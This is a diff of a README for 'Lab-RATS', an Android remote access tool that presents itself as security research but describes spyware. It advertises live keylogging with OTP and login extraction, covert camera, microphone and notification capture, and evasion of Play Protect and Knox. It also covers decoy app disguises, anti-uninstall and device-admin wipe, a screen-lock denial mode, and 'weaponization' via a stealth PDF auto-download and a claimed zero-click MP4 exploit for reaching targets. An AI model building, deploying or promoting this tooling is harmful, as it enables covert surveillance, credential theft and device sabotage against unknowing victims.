@@ -13,8 +13,7 @@
 </p>
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=40&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=40&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"/>
 </p>
 
 > Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*
@@ -25,11 +24,11 @@
 
 <p align="left">
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
-alt="Typing Banner"
- />
+alt="Typing Banner"/>
 </p>
 
 **Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely **eliminating the need for router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
+
 <details>
   <summary>📸 Click to View IPv6 Exploit Vector</summary>
   <br><p align="center">
@@ -37,17 +36,16 @@ alt="Typing Banner"
 </details>
 
 > [!NOTE]
-> **Lab-RATS now supports IPv4 connections** by **hosting on Render.com** *(Free Tier Supported)*. See the **"Command & Control" Option 2** section below for **setup guide**.
+> **Lab-RATS now supports IPv4 connections** by **hosting on Render.com** *(Free Tier Supported)*. See **"Command & Control Option 2"** below for **setup guide**.
 
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
 </p>
 
-### 🔐 Remote C2 Security & Secure Handshake:
-- The **web dashboard** is **protected by a secure login wall** *(Default Password: admin1337)*. The **password can be changed directly from the Terminal home page** for **enhanced security**.
+### 🔐 Remote C2 Security & Secure Handshake: *(DEFAULT PASSWORD = admin1337)*
+- The **web dashboard** is **protected by a secure login wall**. The **password can be changed directly from the Terminal Tab** for **enhanced security**.
 - Implemented a **masked credential handshake**. Passwords are **reversed and Base64 encoded** *(`0x_` prefixed)* on the **client-side before transmission**, rendering them **invisible to browser Network/Payload inspectors**.
 
 ### 📦 Automated APK Generation, Identity Control & Density Scaling:
@@ -56,13 +54,12 @@ alt="Typing Banner"
 - **Resize logos automatically** for **all Android screen densities**.
 
 ### 📱 PC/Mobile Responsive:
-- The **remote web interface** is **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for monitoring **from any device**.
+- The **remote web interface** is **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for **monitoring from any device**.
 
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
 </p>
 
 ### 💉 APK Payload Delivery Vectors:
@@ -70,14 +67,14 @@ alt="Typing Banner"
 
 ### 🛡️ Evasion Engine:
 -  **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
--  **Deep Stealth HTML Shield**: The C2 dashoard **utilizes Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the **tactical structure is ghosted from analysts**.
+-  **Deep Stealth HTML Shield**: The C2 dashoard **utilizes Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser **"Elements"** inspection is **zeroed-out**, and the **tactical structure is ghosted from analysts**.
 -  **Web Hardening**: Assets *(JS/CSS)* are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** *(Right-Click, F12)* to **prevent unauthorized analysis**.
 - **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow** and **class names via ProGuard/R8 integration**.
 - **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.
 
 ### 🎭 Stealth App Decoys:
-**Remotely swap the entire Lab-RATS app identity and icon instantly** using **the "Masquerade Library"** of **convincing, fully functional Clones**:
-- 👀 **Play Protect** *(Default)*: **Used for initial install** it **simulates a system stability update** and **auto-grants all permissions *(other than Accessibility services)* during the process**, achieving **highly successful installs**.
+**Remotely Swap the entire Lab-RATS app identity and icon instantly** using **the "Masquerade Library"** of **convincing, fully functional Clones**:
+- 👀 **Play Protect** *(Default)*: **Used for initial install** it **simulates a system stability update** and **auto-grants all permissions *(other than Accessibility Services)* during the process**, achieving **highly successful installs**.
 - 🧮 **Calculator**: **Performs actual math** with a **tactical logic engine**.
 - 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
 - 🛡️ **Software Update**: **Simulates a legitimate system update screen** to **build target trust**.
@@ -85,7 +82,7 @@ alt="Typing Banner"
 
 ### ☎️ Emergency Recovery & Self Healing:
 - **Dialer Unlock**: Type `*#1337#` on the **phone's keypad** to **unmask the Lab-RATS server interface back into view**.
-- **Hidden Backdoor**: If the **device is in stealth mode**, **rapidly tap the middle of the decoy screen 10 times** to **unlock the C2 server interface**. *(Reverts to stealth mode again once app is closed)*
+- **Hidden Backdoor**: If the **device is in "Stealth mode"**, **rapidly tap the middle of the decoy screen 10 times** to **unlock the C2 server interface**. *(Reverts to stealth mode again once app is closed)*
 - **Automatically detects** and **repairs damaged service bindings** or **revoked permissions in the background**.
 - **Anti-Removal**: **On by default** in the **Ghost Tab**, it **prevents the user from uninstalling** or **force-stopping the app** via Settings.
 
@@ -100,8 +97,7 @@ alt="Typing Banner"
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
 </p>
 
 ### 👻 Ghost Operations:
@@ -110,6 +106,7 @@ alt="Typing Banner"
 - **Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to **overwhelm the device**.
 - **Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
 - **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
+- **NEW! Admin Elevation**: Enables **Device Administration policies** on the target device. **Grants elevated system admin protocols** including **remote instant screen locking**, **emergency data wipe**, and **anti-uninstall protection**.
 
 ### 🧪 Exploit Factory:
 - **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
@@ -126,8 +123,8 @@ alt="Typing Banner"
 - **Intercept every app notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.
 
 ### 📸 Tactical Surveillance Hub *(Ultra-Stability)*:
+- **Remote Feed & Snap Photos**: **Covert image capture** integrated into the **live stream**.
 - **Covert Recording**: **Stealthily record video without any user-facing activity**.
-- **Snap Photos**: **Covert image capture** integrated into the **live stream**.
 - **Nightmode V2**: Aggressive **electronic brightening** for **low-light environments**. Now features **Hardware Breathe Sync** and **AE Bypass** for **zero-freeze operation** on **modern high-latency sensors**.
 
 ### 🎙️ Acoustics & Interception:
@@ -145,13 +142,12 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 - **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.
 
 ### 📊 Telemetry & Reporting:
-- **C2 Auto-Reporting**: **Discrete reporting** of **Date & Time, Device ID, Connection Type *(WiFi/Cellular)*, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charge Status, and Device Storage** to a **centralized Google Sheet or Render C2**.
+- **C2 Auto-Reporting**: **Discrete reporting** of **Date & Time, Device ID, Connection Type *(WiFi/Cellular)*, IP, Port, C2 Dashboard Link, Battery %, Stealth and more** to a **centralized Google Sheet or Render C2**.
 
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"/>
 </p>
 
 ### 🛠️ Termux Bridge Integration:
@@ -170,8 +166,7 @@ termux-reload-settings
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
 </p>
 
 **Lab-RATS** now supports **TWO primary methods** to **track your device fleet**, and **remotely connect/receive data**.
@@ -237,7 +232,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 > 4.  **Copy the Webhook URL provided** and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*
 
 <details>
-  <summary>📸 Click to View Google Sheet Reporting Example</summary>
+  <summary>📸 Click to View Google Sheet Reporting Screenshot</summary>
   <br><p align="center">
   <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="90%">
 </details>
@@ -269,8 +264,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
 </p>
 
 To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your environment meets the following requirements**:
@@ -284,8 +278,8 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 * **Gradle**: Handled automatically via the included `./gradlew` *(Gradle 8.10+)*.
 
 ### 2. C2 Server Hosting Requirements: *(For Option 2: Render.com/Railway)*
-* **Node.js**: **v18.0.0** or higher.
-* **npm**: **v9.0.0** or higher.
+* **Node.js**: **v18.0.0** or **higher**.
+* **npm**: **v9.0.0** or **higher**.
 * **Render / Linux Hosting**: 512 MB RAM minimum *(Render Free Tier supported)*.
 
 ### 3. Android Device Compatibility:
@@ -306,7 +300,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
  />
 </p>
 
-### 1. Building the APK (on PC)
+### 1. Building the APK *(on PC)*
 1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
 2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
@@ -327,7 +321,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 ### 2. Deploying & Installing onto Android Devices
 **Deployment** is **a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
-#### A. Strategic Weaponization: (The Wrapper)
+#### A. Strategic Weaponization: *(The Wrapper)*
 **Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to **wrap your link inside a high-compatibility carrier file**:
 *   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
 *   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
@@ -350,15 +344,13 @@ Once the **Target device** downloads the **APK**:
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
 </p>
 
 **If** you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it **drives further development!**
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"
- />
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
 </p>
 
 **Bug Reports, Add New Feature** and **Pull Requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*
